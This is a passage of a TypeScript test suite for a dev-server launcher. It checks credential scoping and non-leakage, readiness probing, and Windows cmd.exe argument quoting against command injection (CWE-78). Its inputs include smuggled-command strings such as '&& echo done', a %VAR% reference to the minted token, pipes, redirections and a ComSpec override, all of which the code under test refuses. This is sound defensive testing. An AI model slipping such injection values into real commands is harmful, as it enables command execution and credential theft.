    await launchReady(harness, { command: 'NEXT_PUBLIC_FEATURE_FLAG=1 next dev --port 4173' });

    const { options } = harness.spawner.call(0);
    for (const name of SERVICE_ONLY_NAMES) {
      expect(Object.keys(options.env)).not.toContain(name);
    }
    for (const name of FORWARDED_NAMES) {
      expect(options.env[name]).toBe(SERVICE_ENV[name]);
    }
    expect(options.env['NEXT_PUBLIC_FEATURE_FLAG']).toBe('1');
    expect(JSON.stringify(options.env)).not.toContain(fixtureSecret('provider'));
    expect(options.env).toStrictEqual(
      buildDevServerEnv({
        parentEnv: SERVICE_ENV,
        launchEnv: { NEXT_PUBLIC_FEATURE_FLAG: '1' },
        projectRoot: harness.projectRoot,
        ingestUrl: resolveIngestUrl(SERVICE_CONFIG),
        token: harness.issuer.tokens[0] ?? '',
        preloadPath: harness.preloadPath,
        platform: POSIX,
      }),
    );
  });

  it('mints a credential scoped to exactly this project, as a bounded lease', async () => {
    const harness = createHarness();

    await launchReady(harness);

    // AAP §0.5.6: scoped to one projectRoot, revoked when the child exits, and
    // never valid past its lease even if that revocation cannot run.
    expect(harness.issuer.issue.mock.calls).toStrictEqual([
      [
        {
          projectRoot: harness.projectRoot,
          expiresAt: FIXED_NOW + DEFAULT_MANAGED_CREDENTIAL_LEASE_MS,
          lease: true,
        },
      ],
    ]);
  });

  it('asks detection first, handing it the resolved preload and ingest endpoint', async () => {
    const harness = createHarness();

    await launchReady(harness, { devServerUrl: DEV_URL });

    expect(harness.detect).toHaveBeenCalledTimes(1);
    const [input, deps] = harness.detect.mock.calls[0] ?? [];
    expect(input).toEqual({ projectRoot: harness.projectRoot, devServerUrl: DEV_URL });
    expect(deps).toMatchObject({
      config: SERVICE_CONFIG,
      preloadPath: harness.preloadPath,
      ingestUrl: resolveIngestUrl(SERVICE_CONFIG),
    });
  });

  it('keeps the credential out of everything but the child environment', async () => {
    const harness = createHarness();

    const { launch, child } = await launchReady(harness, { sessionId: 'ses-alpha' });
    const token = harness.issuer.tokens[0] ?? '';
    // A dev server that echoes its own environment must not leak the token through the log.
    child.print(`debug: ${PRELOAD_ENV_KEYS.token}=${token}\n`);

    const { args, options } = harness.spawner.call(0);
    expect(token.length).toBeGreaterThan(0);
    expect(Object.entries(options.env).filter(([, value]) => value.includes(token))).toEqual([
      [PRELOAD_ENV_KEYS.token, token],
    ]);
    expect(options.env[PRELOAD_ENV_KEYS.nodeOptions]).not.toContain(token);
    expect(args.join(' ')).not.toContain(token);
    expect(JSON.stringify(launch)).not.toContain(token);
    expect(JSON.stringify(harness.launcher.list())).not.toContain(token);
    expect(serializedRecords(harness.records)).not.toContain(token);
  });

  it('writes nothing into the project across a whole launch and stop cycle', async () => {
    const harness = createHarness();
    const before = snapshotTree(harness.projectRoot);

    await launchReady(harness);
    expectOk(await harness.launcher.stop({ projectRoot: harness.projectRoot }));

    // AAP §0.5.1: this path instruments through the environment only.
    expect(snapshotTree(harness.projectRoot)).toEqual(before);
    expect(before).toEqual([`package.json\n${JSON.stringify(FIXTURE_MANIFEST, null, 2)}\n`]);
  });
});

describe('DevServerLauncher.launch: the command', () => {
  const derivations: {
    readonly packageManager: KnownPackageManagerId;
    readonly file: string;
    readonly args: readonly string[];
  }[] = [
    { packageManager: 'pnpm', file: 'pnpm', args: ['run', DEFAULT_SCRIPT.name] },
    { packageManager: 'npm', file: 'npm', args: ['run', DEFAULT_SCRIPT.name] },
    { packageManager: 'yarn', file: 'yarn', args: [DEFAULT_SCRIPT.name] },
    { packageManager: 'bun', file: 'bun', args: ['run', DEFAULT_SCRIPT.name] },
  ];

  it.each(derivations)(
    'derives [$file, ...args] from the detected $packageManager and dev script',
    async ({ packageManager, file, args }) => {
      const harness = createHarness({ detection: { packageManager } });

      await launchReady(harness);

      const call = harness.spawner.call(0);
      expect(call.command).toBe(file);
      expect(call.args).toEqual(args);
      expect([call.command, ...call.args]).toEqual(
        packageManagerRunArgs(packageManager, DEFAULT_SCRIPT.name),
      );
      expect(harness.launcher.list()[0]).toMatchObject({
        command: file,
        script: DEFAULT_SCRIPT.name,
      });
    },
  );

  it('tokenizes a command override into [bin, ...args], honouring quotes, and never uses a shell on POSIX', async () => {
    const harness = createHarness();

    await launchReady(harness, { command: `next dev --hostname "127.0.0.1" --port '4173'` });

    const call = harness.spawner.call(0);
    expect(call.command).toBe('next');
    expect(call.args).toEqual(['dev', '--hostname', '127.0.0.1', '--port', '4173']);
    expect(call.options.shell).toBe(false);
    expect(call.options.windowsVerbatimArguments).toBe(false);
    const record = harness.launcher.list()[0];
    expect(record?.command).toBe('next');
    expect(record).not.toHaveProperty('script');
    // A quoted word keeps its inner whitespace as one argument; the command
    // policy (not the tokenizer) is what then refuses such a word at launch.
    expect(
      expectOk(parseLaunchCommand('node ./bin/serve.mjs --label "two words" --port 4173', POSIX)),
    ).toStrictEqual({
      file: 'node',
      args: ['./bin/serve.mjs', '--label', 'two words', '--port', '4173'],
      env: {},
    });
  });

  it('applies leading NAME=value assignments to the child, appending to an assigned NODE_OPTIONS', async () => {
    const harness = createHarness();

    await launchReady(harness, {
      command: 'NODE_OPTIONS=--trace-warnings NODE_ENV=test next dev --port 4173',
    });

    const { command, args, options } = harness.spawner.call(0);
    expect(command).toBe('next');
    expect(args).toEqual(['dev', '--port', '4173']);
    expect(PARENT_ENV['NODE_ENV']).toBe('development');
    expect(options.env['NODE_ENV']).toBe('test');
    expect(options.env[PRELOAD_ENV_KEYS.nodeOptions]).toBe(
      `--trace-warnings ${buildPreloadImportFlag(harness.preloadPath)}`,
    );
  });

  it('refuses an unquoted shell operator before minting a credential or spawning', async () => {
    const harness = createHarness();

    const result = await harness.launcher.launch({
      projectRoot: harness.projectRoot,
      command: `pnpm run ${DEFAULT_SCRIPT.name} && echo done`,
    });

    expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'shell-operator');
    expect(harness.issuer.issue).not.toHaveBeenCalled();
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
  });

  it('refuses a project with no dev script, with the relaunch hint, spawning nothing', async () => {
    const harness = createHarness({ detection: { devScript: null } });

    const result = await harness.launcher.launch({ projectRoot: harness.projectRoot });

    const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'no-dev-script');
    expect(error.hint).toBe(
      buildRelaunchHint(
        detectionFor(harness.projectRoot, harness.preloadPath, { devScript: null }),
      ),
    );
    expect(harness.issuer.issue).not.toHaveBeenCalled();
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// Windows: cmd.exe as the executable, expansion syntax refused (CWE-78)
// ---------------------------------------------------------------------------

/** The service's `cmd.exe` in every Windows case. */
const WINDOWS_COMSPEC = 'C:\\Windows\\System32\\cmd.exe';

/** A representative Windows service environment, spelled with Windows casing. */
const WINDOWS_PARENT_ENV: ParentEnvironment = Object.freeze({
  Path: 'C:\\Windows\\System32;C:\\Program Files\\nodejs',
  PATHEXT: '.COM;.EXE;.BAT;.CMD',
  SystemRoot: 'C:\\Windows',
  ComSpec: WINDOWS_COMSPEC,
  USERPROFILE: 'C:\\Users\\dev',
});

/**
 * Split a Windows command line into argv the way the MSVCRT start-up code
 * (and `CommandLineToArgvW`) does: whitespace separates words outside quotes;
 * `"` toggles quoting; `2n` backslashes before a `"` yield `n` backslashes and
 * a toggle, `2n + 1` yield `n` backslashes and a literal `"`; any other
 * backslash is literal.
 */
function parseMsvcrtCommandLine(line: string): string[] {
  const words: string[] = [];
  let current = '';
  let inWord = false;
  let quoted = false;
  let index = 0;
  while (index < line.length) {
    const character = line.charAt(index);
    if (character === '\\') {
      let run = 0;
      while (line.charAt(index) === '\\') {
        run += 1;
        index += 1;
      }
      if (line.charAt(index) === '"') {
        current += '\\'.repeat(Math.floor(run / 2));
        if (run % 2 === 1) {
          current += '"';
          index += 1;
        }
      } else {
        current += '\\'.repeat(run);
      }
      inWord = true;
      continue;
    }
    if (character === '"') {
      quoted = !quoted;
      inWord = true;
      index += 1;
      continue;
    }
    if ((character === ' ' || character === '\t') && !quoted) {
      if (inWord) {
        words.push(current);
        current = '';
        inWord = false;
      }
      index += 1;
      continue;
    }
    current += character;
    inWord = true;
    index += 1;
  }
  if (inWord) {
    words.push(current);
  }
  return words;
}

/**
 * The argv a program receives from `cmd.exe /d /s /c "<line>"`: `/s` strips
 * exactly the first and last quote of what follows `/c`, and the program's
 * MSVCRT start-up code splits the rest.
 */
function argvFromCmdInvocation(args: readonly string[]): string[] {
  expect(args.slice(0, 3)).toEqual(['/d', '/s', '/c']);
  expect(args).toHaveLength(4);
  const line = args[3] ?? '';
  expect(line.startsWith('"')).toBe(true);
  expect(line.endsWith('"')).toBe(true);
  return parseMsvcrtCommandLine(line.slice(1, -1));
}

/**
 * Whether `haystack` holds `word` raw or JSON-escaped — a serialized surface
 * spells `"` and control characters escaped, so a raw search alone would miss
 * an echo of exactly the words these cases plant.
 */
function containsWord(haystack: string, word: string): boolean {
  return haystack.includes(word) || haystack.includes(JSON.stringify(word).slice(1, -1));
}

describe('DevServerLauncher.launch: Windows (cmd.exe as the executable, expansion refused)', () => {
  /** A harness on win32 semantics over the Windows service environment. */
  function windowsHarness(options: HarnessOptions = {}): Harness {
    return createHarness({
      parentEnv: WINDOWS_PARENT_ENV,
      ...options,
      deps: { platform: 'win32', ...options.deps },
    });
  }

  it('spawns ComSpec with /d /s /c and a verbatim, quoted line — never a shell option', async () => {
    const harness = windowsHarness();

    await launchReady(harness, { command: 'next dev --hostname "127.0.0.1" --port 4173' });

    const call = harness.spawner.call(0);
    expect(call.command).toBe(WINDOWS_COMSPEC);
    expect(call.args).toEqual([
      '/d',
      '/s',
      '/c',
      '""next" "dev" "--hostname" "127.0.0.1" "--port" "4173""',
    ]);
    expect(call.options.shell).toBe(false);
    expect(call.options.windowsVerbatimArguments).toBe(true);
    expect(call.options.detached).toBe(false);
    expect(argvFromCmdInvocation(call.args)).toEqual([
      'next',
      'dev',
      '--hostname',
      '127.0.0.1',
      '--port',
      '4173',
    ]);
    // The registry names the developer's executable, not cmd.exe.
    expect(harness.launcher.list()[0]?.command).toBe('next');
  });

  it.each([
    { packageManager: 'pnpm' as const, file: 'pnpm' },
    { packageManager: 'npm' as const, file: 'npm' },
  ])(
    'runs the derived $packageManager dev-script command through cmd.exe',
    async ({ packageManager, file }) => {
      const harness = windowsHarness({ detection: { packageManager } });

      await launchReady(harness);

      const call = harness.spawner.call(0);
      expect(call.command).toBe(WINDOWS_COMSPEC);
      expect(call.options.windowsVerbatimArguments).toBe(true);
      expect(argvFromCmdInvocation(call.args)).toEqual(
        packageManagerRunArgs(packageManager, DEFAULT_SCRIPT.name),
      );
      expect(harness.launcher.list()[0]).toMatchObject({
        command: file,
        script: DEFAULT_SCRIPT.name,
      });
    },
  );

  it('round-trips spaces and parentheses in the service Node and the framework CLI path literally', async () => {
    // Trailing backslashes are exercised on buildWindowsCommandInvocation
    // itself: no word the command policy accepts can end in one.
    const node = 'C:\\Program Files (x86)\\nodejs\\node.exe';
    const cli = 'C:\\work dir (2)\\app\\node_modules\\next\\dist\\bin\\next';
    const harness = windowsHarness({
      deps: {
        nodeExecutablePath: node,
        realpath: (path) => path,
        isTrustedDevCli: (path) => path === cli,
      },
    });

    await launchReady(harness, { command: `'${node}' '${cli}' dev --port 4173` });

    const call = harness.spawner.call(0);
    expect(argvFromCmdInvocation(call.args)).toEqual([node, cli, 'dev', '--port', '4173']);
    expect(harness.launcher.list()[0]?.command).toBe('node.exe');
  });

  it('takes cmd.exe from the service environment, never from an assignment in the request', async () => {
    const refusing = windowsHarness();

    // A request cannot even assign it: ComSpec is off the launch-assignment list.
    const refused = await refusing.launcher.launch({
      projectRoot: refusing.projectRoot,
      command: `ComSpec='C:\\elsewhere\\cmd.exe' pnpm run ${DEFAULT_SCRIPT.name}`,
    });
    expectErr(refused, 'DEV_SERVER_LAUNCH_FAILED', 'env-assignment-not-allowed');
    expect(refusing.issuer.issue).not.toHaveBeenCalled();
    expect(refusing.spawner.spawn).not.toHaveBeenCalled();

    // An allowed assignment reaches the child; cmd.exe is still the service's.
    const harness = windowsHarness();
    await launchReady(harness, {
      command: `NEXT_TELEMETRY_DISABLED=1 pnpm run ${DEFAULT_SCRIPT.name}`,
    });

    const call = harness.spawner.call(0);
    expect(call.command).toBe(WINDOWS_COMSPEC);
    expect(argvFromCmdInvocation(call.args)).toEqual(['pnpm', 'run', DEFAULT_SCRIPT.name]);
    expect(call.options.env['NEXT_TELEMETRY_DISABLED']).toBe('1');
  });

  /** A trusted-looking Windows framework CLI path with `word` planted in one of its directories. */
  function plantedCliPath(word: string): string {
    return `C:\\work\\${word}\\node_modules\\next\\dist\\bin\\next`;
  }

  /** Every surface a refusal reaches, none of which may hold the planted word. */
  function expectWordUnechoed(harness: Harness, error: DebuggenError, word: string): void {
    for (const surface of [
      error.message,
      error.hint ?? '',
      JSON.stringify(error.details),
      serializedRecords(harness.records),
    ]) {
      expect(containsWord(surface, word)).toBe(false);
    }
  }

  const TOKEN_REFERENCE = `%${PRELOAD_ENV_KEYS.token}%`;

  it.each([
    { label: 'a %VAR% reference to the minted credential', word: TOKEN_REFERENCE },
    { label: 'a delayed !VAR! expansion', word: '!PATH!' },
    { label: 'a double quote', word: 'a"b' },
    { label: 'a caret escape', word: 'x^y' },
    { label: 'an ampersand', word: 'a&b' },
    { label: 'a pipe', word: 'a|b' },
    { label: 'an input redirection', word: 'in<put' },
    { label: 'an output redirection', word: 'out>put' },
  ])(
    'refuses $label in the framework CLI path at the cmd.exe guard, before minting a credential or spawning, never echoing the word',
    async ({ word }) => {
      // The CLI path is the one accepted word the dev-server argument
      // allowlist does not cover, so the cmd.exe guard is what stands between
      // it and the line.
      const harness = windowsHarness({ deps: { isTrustedDevCli: () => true } });

      const result = await harness.launcher.launch({
        projectRoot: harness.projectRoot,
        command: `node '${plantedCliPath(word)}' dev`,
      });

      const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'windows-shell-metacharacter');
      expect(error.message).toContain('argument 1');
      expect(error.hint).toContain('%VAR%');
      expect(error.hint).toContain('package.json script');
      expect(error.details).toStrictEqual({
        reason: 'windows-shell-metacharacter',
        position: 'argument',
        argument: 1,
      });
      expect(harness.issuer.issue).not.toHaveBeenCalled();
      expect(harness.spawner.spawn).not.toHaveBeenCalled();
      expectWordUnechoed(harness, error, word);
    },
  );

  it.each([
    { label: 'a carriage return', word: 'line\rbreak' },
    { label: 'a line feed', word: 'line\nbreak' },
  ])(
    'refuses $label in the framework CLI path as an untrusted CLI, never echoing the word',
    async ({ word }) => {
      const harness = windowsHarness({ deps: { isTrustedDevCli: () => true } });

      const result = await harness.launcher.launch({
        projectRoot: harness.projectRoot,
        command: `node '${plantedCliPath(word)}' dev`,
      });

      const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'dev-cli-untrusted');
      expect(error.details).toStrictEqual({ reason: 'dev-cli-untrusted' });
      expect(harness.issuer.issue).not.toHaveBeenCalled();
      expect(harness.spawner.spawn).not.toHaveBeenCalled();
      expectWordUnechoed(harness, error, word);
    },
  );

  // The dev-server argument allowlist admits no word holding any of these
  // characters, so each is refused before the cmd.exe guard is reached.
  it.each(
    [
      { label: 'a %VAR% reference to the minted credential', word: TOKEN_REFERENCE },
      { label: 'a delayed !VAR! expansion', word: '!PATH!' },
      { label: 'a double quote', word: 'a"b' },
      { label: 'a caret escape', word: 'x^y' },
      { label: 'an ampersand', word: 'a&b' },
      { label: 'a pipe', word: 'a|b' },
      { label: 'an input redirection', word: 'in<put' },
      { label: 'an output redirection', word: 'out>put' },
      { label: 'a carriage return', word: 'line\rbreak' },
      { label: 'a line feed', word: 'line\nbreak' },
    ].map((entry) => ({
      ...entry,
      reason: 'argument-not-allowed',
      details: { reason: 'argument-not-allowed', argument: 2 },
    })),
  )(
    'refuses $label as a dev-server argument ($reason) before minting a credential or spawning, never echoing the word',
    async ({ word, reason, details }) => {
      const harness = windowsHarness();

      const result = await harness.launcher.launch({
        projectRoot: harness.projectRoot,
        command: `next dev '${word}'`,
      });

      const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', reason);
      expect(error.details).toStrictEqual(details);
      expect(error.hint).toContain('package.json script');
      expect(harness.issuer.issue).not.toHaveBeenCalled();
      expect(harness.spawner.spawn).not.toHaveBeenCalled();
      expectWordUnechoed(harness, error, word);
    },
  );

  it('refuses a metacharacter in the executable, naming only "the executable"', async () => {
    // An arbitrary program never reaches the cmd.exe guard: the policy refuses it.
    const refusing = windowsHarness();
    const refused = await refusing.launcher.launch({
      projectRoot: refusing.projectRoot,
      command: 'tool%PATH%.exe --serve',
    });
    const policyError = expectErr(refused, 'DEV_SERVER_LAUNCH_FAILED', 'executable-not-allowed');
    expect(errorSurfaces(policyError)).not.toContain('tool%PATH%');

    // The service's own Node, installed under a directory whose name holds
    // %PATH%, passes the policy and is refused by the guard, which names only
    // "the executable".
    const node = 'C:\\tools%PATH%\\node.exe';
    const harness = windowsHarness({
      deps: { nodeExecutablePath: node, realpath: (path) => path, isTrustedDevCli: () => true },
    });

    const result = await harness.launcher.launch({
      projectRoot: harness.projectRoot,
      command: `'${node}' '${plantedCliPath('app')}' dev`,
    });

    const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'windows-shell-metacharacter');
    expect(error.message).toContain('the executable');
    expect(error.details).toStrictEqual({
      reason: 'windows-shell-metacharacter',
      position: 'executable',
    });
    expect(errorSurfaces(error)).not.toContain('tools%PATH%');
    for (const probed of [refusing, harness]) {
      expect(probed.issuer.issue).not.toHaveBeenCalled();
      expect(probed.spawner.spawn).not.toHaveBeenCalled();
    }
  });

  it('leaves POSIX a direct spawn: the same characters in the CLI path are literal there', async () => {
    const cli = '/opt/work/!PATH!%HOME%/node_modules/next/dist/bin/next';
    const harness = createHarness({ deps: { isTrustedDevCli: (path) => path === cli } });

    await launchReady(harness, { command: `node '${cli}' dev --port 4173` });

    const call = harness.spawner.call(0);
    expect(call.command).toBe('node');
    expect(call.args).toEqual([cli, 'dev', '--port', '4173']);
    expect(call.options.shell).toBe(false);
    expect(call.options.windowsVerbatimArguments).toBe(false);
  });
});

describe('buildWindowsCommandInvocation', () => {
  it('quotes every word, doubling only trailing backslashes, under /d /s /c', () => {
    const built = expectOk(
      buildWindowsCommandInvocation({
        file: 'pnpm',
        args: ['run', 'start:local', 'C:\\out dir\\', 'a\\b', ''],
        comSpec: WINDOWS_COMSPEC,
      }),
    );

    expect(built.command).toBe(WINDOWS_COMSPEC);
    expect(built.args).toEqual([
      '/d',
      '/s',
      '/c',
      '""pnpm" "run" "start:local" "C:\\out dir\\\\" "a\\b" """',
    ]);
    expect(argvFromCmdInvocation(built.args)).toEqual([
      'pnpm',
      'run',
      'start:local',
      'C:\\out dir\\',
      'a\\b',
      '',
    ]);
    expect(Object.isFrozen(built)).toBe(true);
  });

  it.each([
    'parentheses ( ) and spaces',
    'semicolons; commas, equals= and at@',
    "quotes ' and backticks ` and dollars $HOME",
    'brackets [x] {y} and tildes ~',
    'unicode — naïve café',
  ])('allows %j', (word) => {
    const built = expectOk(
      buildWindowsCommandInvocation({ file: 'node', args: [word], comSpec: WINDOWS_COMSPEC }),
    );

    expect(argvFromCmdInvocation(built.args)).toEqual(['node', word]);
  });

  it('refuses every C0 control and DEL, and each cmd.exe metacharacter', () => {
    const refused = [
      ...Array.from({ length: 0x20 }, (_, code) => String.fromCharCode(code)),
      String.fromCharCode(0x7f),
      ...'%!"^&|<>',
    ];
    for (const character of refused) {
      const result = buildWindowsCommandInvocation({
        file: 'node',
        args: ['ok', `a${character}b`],
        comSpec: WINDOWS_COMSPEC,
      });
      const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'windows-shell-metacharacter');
      expect(error.message).toContain('argument 2');
      expect(containsWord(errorSurfaces(error), `a${character}b`)).toBe(false);
    }
  });

  it('names the executable when the executable holds a metacharacter', () => {
    const error = expectErr(
      buildWindowsCommandInvocation({ file: 'run&exit', args: [], comSpec: WINDOWS_COMSPEC }),
      'DEV_SERVER_LAUNCH_FAILED',
      'windows-shell-metacharacter',
    );

    expect(error.message).toContain('the executable');
    expect(errorSurfaces(error)).not.toContain('run&exit');
  });
});

describe('resolveWindowsComSpec', () => {
  it.each([
    {
      label: 'an absolute ComSpec naming cmd.exe, whatever the casing',
      env: { comspec: 'D:\\WINDOWS\\SYSTEM32\\CMD.EXE', SystemRoot: 'C:\\Windows' },
      expected: 'D:\\WINDOWS\\SYSTEM32\\CMD.EXE',
    },
    {
      label: 'SystemRoot when ComSpec names another program',
      env: { ComSpec: 'C:\\tools\\other-shell.exe', SystemRoot: 'C:\\Windows' },
      expected: 'C:\\Windows\\System32\\cmd.exe',
    },
    {
      label: 'SystemRoot when ComSpec is relative',
      env: { ComSpec: 'cmd.exe', SYSTEMROOT: 'C:\\Windows\\' },
      expected: 'C:\\Windows\\System32\\cmd.exe',
    },
    {
      label: 'SystemRoot when ComSpec contains whitespace',
      env: { ComSpec: 'C:\\Program Files\\cmd.exe', SystemRoot: 'C:\\Windows' },
      expected: 'C:\\Windows\\System32\\cmd.exe',
    },
    {
      label: 'SystemRoot when ComSpec contains an expansion',
      env: { ComSpec: 'C:\\%TEMP%\\cmd.exe', SystemRoot: 'C:\\Windows' },
      expected: 'C:\\Windows\\System32\\cmd.exe',
    },
    { label: 'cmd.exe when nothing usable is set', env: {}, expected: 'cmd.exe' },
    {
      label: 'cmd.exe when SystemRoot is relative',
      env: { SystemRoot: 'Windows' },
      expected: 'cmd.exe',
    },
  ])('resolves $label', ({ env, expected }) => {
    expect(resolveWindowsComSpec(env)).toBe(expected);
  });
});

describe('DevServerLauncher.launch: readiness', () => {
  it('is ready once the announced address answers and its listener belongs to the child, skipping the service’s own port', async () => {
    const harness = createHarness();
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    // The ingest endpoint is a loopback URL too, here after a serving label;
    // it must never be taken for the dev server, nor even probed.
    child.print(`ready - listening on ${resolveIngestUrl(SERVICE_CONFIG)}\n`);
    child.print('\u001b[32m  - Local:\u001b[0m   \u001b[1mhttp://localhost:4173\u001b[0m\n');
    const launch = expectOk(await pending);

    expect(launch).toMatchObject({
      managed: true,
      alreadyRunning: false,
      devServerUrl: 'http://localhost:4173/',
      pid: FIRST_PID,
    });
    const response = toDevServerLaunchResponse(launch);
    expect(response).toStrictEqual({ devServerUrl: 'http://localhost:4173/', pid: FIRST_PID });
    expect(devServerLaunchResponseSchema.safeParse(response).success).toBe(true);
    // Printed text is a candidate, never readiness: the address was probed,
    // and the operating system was asked who holds its port.
    expect(harness.probe.mock.calls.map(([url]) => url)).toEqual(['http://localhost:4173/']);
    expect(harness.ownership.mock.calls).toEqual([[FIRST_PID, 4173]]);
    expect(harness.launcher.list()).toMatchObject([
      { status: 'ready', devServerUrl: 'http://localhost:4173/' },
    ]);
    const ready = harness.records.find(
      (record) => record.message === 'The launched dev server is ready',
    );
    expect(ready?.fields).toMatchObject({
      identifiedBy: 'launched-child',
      framework: 'next',
      devServerUrl: 'http://localhost:4173/',
    });
  });

  it('falls back to polling the requested URL when the child prints no address, ready once the child owns its port', async () => {
    vi.useFakeTimers();
    let probes = 0;
    const harness = createHarness({
      probe: (url) => {
        probes += 1;
        return Promise.resolve(probeAnswer(url, probes >= 3, 'next'));
      },
      // The child printed nothing, but its tree holds the requested port.
      ownership: ownershipByPort({ [portOf(DEV_ORIGIN)]: true }),
    });
    const pending = harness.launcher.launch({
      projectRoot: harness.projectRoot,
      devServerUrl: DEV_URL,
    });
    await spawnedChild(harness, pending);

    await vi.advanceTimersByTimeAsync(200);
    const launch = expectOk(await pending);

    expect(launch).toMatchObject({
      managed: true,
      alreadyRunning: false,
      devServerUrl: DEV_URL,
      pid: FIRST_PID,
    });
    expect(devServerLaunchResponseSchema.safeParse(toDevServerLaunchResponse(launch)).success).toBe(
      true,
    );
    expect(harness.probe).toHaveBeenCalledTimes(3);
    expect(harness.probe.mock.calls.map(([url]) => url)).toEqual([DEV_URL, DEV_URL, DEV_URL]);
    // Asked only once an answer arrived, with the requested URL's port.
    expect(harness.ownership.mock.calls).toEqual([[FIRST_PID, portOf(DEV_ORIGIN)]]);
    // The readiness polls are gone; the one timer left renews the running
    // child's credential lease, and it goes with the child.
    expect(vi.getTimerCount()).toBe(1);
    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(0);
    expectOk(await stopping);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('reports an early exit with an output digest — counts and diagnostic ids, no line — and revokes the credential', async () => {
    const harness = createHarness();
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);
    const token = harness.issuer.tokens[0] ?? '';

    child.print('  compiling the application…\n');
    child.print(`worker echoed credential ${token} before failing\n`, 'stderr');
    child.print('Error: listen EADDRINUSE: address already in use :::4173\n', 'stderr');
    child.finish(1, null);
    const error = expectErr(await pending, 'DEV_SERVER_LAUNCH_FAILED', 'exited-before-ready');

    expect(error.message).toContain('code 1');
    expect(error.hint).toContain('Its output reported that the port is already in use.');
    expect(error.hint).toContain('Run the dev script in a terminal to read its full output.');
    expect(error.details).toStrictEqual({
      reason: 'exited-before-ready',
      exitCode: 1,
      signal: null,
      output: { stdoutLines: 1, stderrLines: 2, diagnostics: ['port-in-use'] },
    });
    for (const fragment of ['worker echoed', 'EADDRINUSE', 'compiling', ':::4173', token]) {
      expect(errorSurfaces(error)).not.toContain(fragment);
      expect(serializedRecords(harness.records)).not.toContain(fragment);
    }

    const exitRecord = harness.records.find(
      (record) => record.message === 'The launched dev server exited before it was ready',
    );
    expect(exitRecord?.fields['output']).toStrictEqual({
      stdoutLines: 1,
      stderrLines: 2,
      truncatedLines: 0,
      diagnostics: ['port-in-use'],
    });

    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.issuer.revoke.mock.calls[0]?.[0]).toStrictEqual({
      projectRoot: harness.projectRoot,
      token,
      credentialId: 'cred-1',
    });
    expect(child.signals).toEqual([]);
    expect(harness.launcher.list()).toEqual([]);
  });

  it('stops a child that never becomes ready, revokes its credential, and leaves no timer behind', async () => {
    vi.useFakeTimers();
    const harness = createHarness({ deps: { readyTimeoutMs: 2_000 } });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);
    let settled = false;
    void pending.then(() => {
      settled = true;
    });

    await vi.advanceTimersByTimeAsync(1_999);
    expect(settled).toBe(false);
    expect(child.signals).toEqual([]);

    await vi.advanceTimersByTimeAsync(1);
    const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-timeout');

    expect(error.hint).toContain('debuggen.devServerUrl');
    expect(error.details?.['timeoutMs']).toBe(2_000);
    expect(child.signals).toEqual(['SIGTERM']);
    expect(child.exited).toBe(true);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.launcher.list()).toEqual([]);
    expect(vi.getTimerCount()).toBe(0);
    // Wired once, never re-attached by the retry loop.
    expect(child.stdout.listenerCount('data')).toBe(1);
    expect(child.listenerCount('exit')).toBe(1);
  });

  it('reports a missing package-manager binary (ENOENT) distinctly from a timeout', async () => {
    const harness = createHarness({ children: [{ pid: null }] });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.failToSpawn('ENOENT');
    const error = expectErr(await pending, 'DEV_SERVER_LAUNCH_FAILED', 'spawn-failed');

    expect(error.code).not.toBe('DEV_SERVER_UNAVAILABLE');
    expect(error.details?.['errorCode']).toBe('ENOENT');
    expect(error.hint).toContain('"pnpm" was not found on the PATH');
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.launcher.list()).toEqual([]);
  });

  it('reports a spawn that throws ENOENT synchronously, revoking the credential', async () => {
    const spawnImpl = vi.fn<SpawnLike>(() => {
      throw Object.assign(new Error('spawn pnpm ENOENT'), { code: 'ENOENT' });
    });
    const harness = createHarness({ deps: { spawnImpl } });

    const result = await harness.launcher.launch({ projectRoot: harness.projectRoot });

    const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'spawn-failed');
    expect(error.details?.['errorCode']).toBe('ENOENT');
    expect(spawnImpl).toHaveBeenCalledTimes(1);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.launcher.list()).toEqual([]);
  });

  it('is cancelled cleanly when the project is stopped while it waits for readiness', async () => {
    const harness = createHarness();
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    const stopped = expectOk(await harness.launcher.stop({ projectRoot: harness.projectRoot }));

    expect(stopped).toStrictEqual({ stopped: true });
    expectErr(await pending, 'DEV_SERVER_LAUNCH_FAILED', 'cancelled');
    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.launcher.list()).toEqual([]);
  });
});

describe('DevServerLauncher.launch: the detected dev script without a script list', () => {
  it('runs the detected dev script when the detection carries no script names', async () => {
    // A detection that selected its dev script from the manifest but reports
    // no `devServerScripts` list still names a dev-server script: the derived
    // run must not be refused as undeclared.
    const harness = createHarness({ detection: { devServerScripts: null } });

    await launchReady(harness);

    const { command, args } = harness.spawner.call(0);
    expect([command, ...args]).toEqual(['pnpm', 'run', DEFAULT_SCRIPT.name]);
    expect(harness.launcher.list()[0]?.script).toBe(DEFAULT_SCRIPT.name);
  });

  it('still refuses a request naming that script when the detection carries no script names', async () => {
    const harness = createHarness({ detection: { devServerScripts: null } });

    const result = await harness.launcher.launch({
      projectRoot: harness.projectRoot,
